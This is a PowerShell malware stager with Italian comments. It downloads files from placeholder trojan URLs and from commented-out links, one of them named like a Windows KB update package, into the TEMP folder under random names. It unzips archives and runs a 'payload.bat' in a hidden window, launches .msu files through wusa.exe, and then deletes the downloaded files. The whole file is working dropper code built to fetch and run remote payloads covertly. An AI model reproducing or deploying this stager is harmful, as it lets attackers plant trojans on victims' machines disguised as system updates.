# Stager COMPLETO - MSU MessageBox VISIBLE - SINTASSI PERFETTA
# Controllo output: $VERBOSE = $true per vedere i messaggi, $false per silenzio totale

$VERBOSE= $false  # Cambia in $false per disattivare tutti i messaggi
$urls= @(
    # "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/07.STAGER-new.zip",
    "[TROJAN-URL]/[STAGERNAME]",
    # "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/windows6.0-kb4580971-x86_5a4cf976c650cf9b6a0800aaf6016726f4b08c7d.msu"
    "[TROJAN-URL]/[TROJAN_FE]"
)

function Write-VerboseMsg {
    param([string]$Message)
    if ($VERBOSE) {
        $ts= Get-Date -Format "HH:mm:ss"
        Write-Host "`n[$ts] $Message"
    }
}

foreach ($url in $urls) {
    Write-VerboseMsg $url
    
    $rand= [guid]::NewGuid().ToString("N").Substring(0,8)
    $tmpFile= "$env:TEMP\$rand.tmp"
    
    $wc= New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $tmpFile)
    
    $fileInfo= Get-Item $tmpFile
    $size= [math]::Round($fileInfo.Length / 1KB)
    Write-VerboseMsg "Downloaded: $size KB"
    
    if ($fileInfo.Length -lt 5120) { 
        Remove-Item $tmpFile -Force 
        continue 
    }
    
    $ext= [System.IO.Path]::GetExtension($url)
    $finalFile= $tmpFile -replace "\\.tmp$", $ext
    Rename-Item $tmpFile $finalFile -Force
    
    Write-VerboseMsg "Final file: $finalFile"
    
    $bytes= Get-Content $finalFile -Encoding Byte -TotalCount 4 -ErrorAction SilentlyContinue
    if ($bytes -and $bytes[0] -eq 80 -and $bytes[1] -eq 75) {
        Write-VerboseMsg "ZIP detected - extracting..."
        $extractPath= "$env:TEMP\$rand"
        New-Item $extractPath -ItemType Directory -Force | Out-Null
        
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($finalFile, $extractPath)
        
        $payloadFiles= Get-ChildItem -Path $extractPath -Recurse -Filter "payload.bat" -File
        if ($payloadFiles) {
            $payload= $payloadFiles[0].FullName
            $payloadDir= Split-Path $payload -Parent
            
            Write-VerboseMsg "Executing ZIP payload from: $payloadDir"
            Set-Location $payloadDir
            $null= Start-Process -FilePath $payload -WindowStyle Hidden -PassThru
            Write-VerboseMsg "ZIP payload launched"
        }
        
        Remove-Item $finalFile -Force -ErrorAction SilentlyContinue
    }
    else {
        Write-VerboseMsg "Non-ZIP file: $ext"
        if ($ext -eq ".msu") {
            Write-VerboseMsg "Executing MSU with VISIBLE dialog..."
            $msuArgs= @("`"$finalFile`"")
            $proc= Start-Process -FilePath "${env:windir}\System32\wusa.exe" -ArgumentList $msuArgs -Wait -PassThru
            Write-VerboseMsg "MSU completed (dialog shown)"
        }
    }
    
    if (Test-Path $finalFile) { 
        Remove-Item $finalFile -Force -ErrorAction SilentlyContinue 
    }
    Write-VerboseMsg "Cleanup complete"
}

if ($VERBOSE) {
    Write-VerboseMsg "All files processed successfully!"
}
